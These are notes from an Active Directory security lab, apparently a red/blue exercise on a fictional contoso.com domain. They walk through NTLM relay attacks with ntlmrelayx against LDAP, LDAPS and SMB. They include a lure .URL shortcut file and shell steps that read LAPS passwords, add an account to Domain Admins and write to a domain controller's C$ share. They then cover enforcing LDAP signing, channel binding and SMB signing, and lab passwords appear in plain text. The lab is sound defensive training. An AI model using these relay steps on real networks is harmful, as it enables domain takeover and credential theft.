
![[Pasted image 20231013161307.png]]

Protection 
- Enforce LDAP signing 
- Enforce LDAPs channel binding 
- Enforce SMB signing
- Enforce HTTPs with Extended

Protection 
- Disable NTLM on web services 
- Use the Protected Users group (for privileged account) 
- Block NTLM on system where it is not required (hard to achieve) 
- Disable NTLM v1

## How to Abuse NTLM authentication protocol

Perform an NTLM relay attack to impersonate Katrina's account against AD DS.

###  Prepare the attack

Start a fake HTTP service with the only objective to perform an NTLM relay attack against AD DS using LDAP.
  
Use of the python script **ntlmrelayx.py** that listen on a fake HTTP service and relay all connections to AD and open an LDAP interactive shell.

```powershell
python.exe ntlmrelayx.py --no-smb-server --no-raw-server --no-wcf-server -i -t ldap://dc01

or 

python.exe ntlmrelayx.py --no-smb-server --no-raw-server --no-wcf-server -i -t ldaps://dc01.contoso.com
```

It starts to listen on connections on port 80. Leave that running.

Create a shortcut file `CLICK.URL` to trick a user into clicking it
    ```
    [{000214A0-0000-0000-C000-000000000046}]
    Prop3=19,2
    [InternetShortcut]
    IDList=
    URL=http://cli01.contoso.com/
    IconIndex=234
    HotKey=0
    IconFile=C:\Windows\System32\SHELL32.DLL
    ```

### Relay an authentication

When we click on the file : 
![[Pasted image 20231021191610.png]]

In your **Windows Terminal (Admin)** window, you should see the following: 

![[Pasted image 20231021191700.png]]
You can see that the message indicates that an interactive shell was starting.

Now we can start a netcat on : 
`ncat 127.0.0.1 11000` 

In the **C:\Program File (x86)\Nmap\ncat.exe** window run `help` to get the list of commands. Then type `get_laps_password SRV01$`. 
Here you go, you have the password of the default local admin of SRV01. 
Let's play a joke on **Mister Blue** and add yourself to the **Domain Admins** group. Run the following: `add_user_to_group red "domain admins"`. 
Here you go, your own account is now a member of the domain admins group: ![DA.png](https://labondemand.blob.core.windows.net/content/lab127288/DA.png)

### Remediation - Enforce LDAP signing

The attack was possible because of multiple factors:

1. The user clicked where she shouldn't have, maybe a bit of user training is a good idea
2. NTLM was enabled for an admin account
3. Signing was not enforce on the LDAP component of the domain controller

For 1, well go train your admins. For 2, we have seen some mitigation already. For 3, let's enforce LDAP signing.

In the **Run** window, type `gpmc.msc` and click **OK**.

Navigate to **Group Policy Management > Forest: contoso.com > Domain > contoso.com > Domain Controllers**. Right click on Default Domain Controller Policy and click Edit.

**Default Domain Controller Policy [DC01.contoso.com]** > **Computer Configuration** > **Policies** > **Windows Settings** > **Security Settings** > **Local Policies** > **Security Options**. 

Double click on **Domain controller: LDAP server signing requirements**. 

Then click **Define this policy setting**, pick **Require signing** from the drop down menu, and click **OK**
    Forcing signing in that case did not affect the connection made over TLS. Enforcing LDAP Signing is not enough. You also need to enforce what is called the Channel Binding Token for LDAPS connections.


### Then enforce LDAPS channel binding token

This time you are going to do things on **DC02**. We will see why a bit later.

1. Log on **[DC02](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\blue` or `CONTOSO\katrina.mendoza.adm`|
    |Password|`NeverTrustAny1!`|
    
2. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Run**.
    
3. In the **Run** window, type `gpmc.msc` and click **OK**.
    
4. In the **Group Policy Management** window, navigate to **Group Policy Management** > **Forest: contoso.com** > **Domain** > **contoso.com** > **Domain Controllers**. Right click on **Default Domain Controller Policy** and click **Edit**.
    
5. In the **Group Policy Management Editor** window, navigate **Default Domain Controller Policy [DC01.contoso.com]** > **Computer Configuration** > **Policies** > **Windows Settings** > **Security Settings** > **Local Policies** > **Security Options**. Double click on **Domain controller: LDAP server channel binding token requirements**. Pick **Always** from the drop down menu, and click **OK**.
    
    > If you do not see this option, you might be connected to DC01 and not DC02. DC01 is missing security updates in your lab. Hence the option isn't there. That's why we do that on DC02. Note that the GPMC console can be pointing to DC01 that's fine. But the console has to be opened from DC02 in your lab.
    
6. Close the **Group Policy Management Editor** window.
    
    Like for LDAP Signing, the impact might be considerable on legacy applications and a thorough audit needs to be conducted before enabling this. But without this, look at how easy it was to workaround the signing requirement for LDAP with your NTLM relay attack…
    
    ❓ Why are we doing that on DC02? **Click here to see the answer**.
    

If you want to check if that protection worked, you can run the following from **CLI01**: `python.exe ntlmrelayx.py --no-smb-server --no-raw-server --no-wcf-server -i -t ldaps://dc02.contoso.com` and try to connect with Katrina again.

```
📝 What is the error message?
```

### Task 6 - Try again to relay Katrina's connection

**Miss Red**, it looks like **Mister Blue** is not taking you seriously.

1. Log back on **[CLI01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\red`|
    |Password|`NeverTrustAny1!`|
    
2. In your **Windows Terminal (Admin)** window, hit **Ctrl** + **C** to terminate the **ntlmrelayx** script execution.
    
3. Then execute `python.exe ntlmrelayx.py --no-smb-server --no-raw-server --no-wcf-server -i -t smb://192.168.1.11 -smb2support --remove-mic`
    
    This time it is an NTLM relay to the SMB server of DC01, not LDAP. So this time if SMB Signing is not enforce on the server side, you'll get an easy access too 😎
    
4. Quickly stop by **[DC02](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\katrina.mendoza.adm`|
    |Password|`NeverTrustAny1!`|
    
5. Refresh the **Edge** window (it should still be the address `http://cli01.contoso.com`).
    
6. Then go back on **[CLI01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)**. And have a look at the terminal: ![SMBOWNED.png](https://labondemand.blob.core.windows.net/content/lab127288/SMBOWNED.png)
    
7. Right clicking on the Start menu ![11menu.png](https://labondemand.blob.core.windows.net/content/lab127288/11menu.png) and click on **Run**.
    
8. In the **Run** window, type `ncat 127.0.0.1 11000` and click **OK**.
    
9. In the **C:\Program File (x86)\Nmap\ncat.exe** window run `shares`. This display all available share. Let's get into **C$**, run `use c$` then run `mkdir IWASTHERE`. Now list all the files and folders in the share with `ls`. You can see your new folder of the C drive of the DC: ![shellsmb.png](https://labondemand.blob.core.windows.net/content/lab127288/shellsmb.png)
    

How to block this one? Well simple. Like we enforced LDAP signing, **Mister Blue** will have to enable SMB signing.

### Task 7 - Enforce SMB Signing

**Mister Blue**, it seems that **Miss Red** is always one step ahead. You blocked relay attack on LDAP, but not on the SMB service (the file server service). And this time the scope of the risk is bigger. The LDAP service is available only on domain controllers. But the file server service, it might be on pretty much all machines. So, to stop the attack everywhere, let's enforce the SMB signing on all systems.

1. Log on **[DC01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\blue`|
    |Password|`NeverTrustAny1!`|
    
    Let's start by removing **CONTOSO\red** from the **Domain Admins** group…
    
2. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Run**.
    
3. In the **Run** window, type `dsa.msc` and click **OK**.
    
4. In the **Active Directory Users and Computers** console, right click on the domain name **contoso.com** and click **Find…**.
    
5. In the **Find Users, Contacts, and Groups** window, type `red` in the **Name** field and click **Find Now**. In the results section, double click on the **Miss Red**, select the **Member Of** tab, select **Domain Admins** from the list of groups and click **Remove**, then **Yes** to confirm and then **OK** to close the **Miss Red Properties** window.
    
6. Close the **Find Users, Contacts, and Groups** window and then close the **Active Directory Users and Computers** console.
    
    Now let's enforce LDAP signing.
    
7. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Run**.
    
8. In the **Run** window, type `gpmc.msc` and click **OK**.
    
9. In the **Group Policy Management** window, navigate to **Group Policy Management** > **Forest: contoso.com** > **Domain** > **contoso.com**. Right click on **Default Domain Policy** and click **Edit**.
    
10. In the **Group Policy Management Editor** window, navigate **Default Domain Controller Policy [DC01.contoso.com]** > **Computer Configuration** > **Policies** > **Windows Settings** > **Security Settings** > **Local Policies** > **Security Options**. Double click on **Microsoft network server: Digitally sign communications (always)**. Then click **Define this policy setting**, select **Enabled** and click **OK**.
    
11. Close the **Group Policy Management Editor** window and the **Group Policy Management** console.
    

**⚠️ Can you break stuff doing that?**

**Absolutely!** But that's the price to pay to get rid of these relay attacks. And in 2022 (or whatever century you run this lab in), if your apps and appliances don't support SMB signing, you should really update them or get rid of them.

**BUT** it is super important to push for that configuration in you want to defeat NLTM relay attacks.

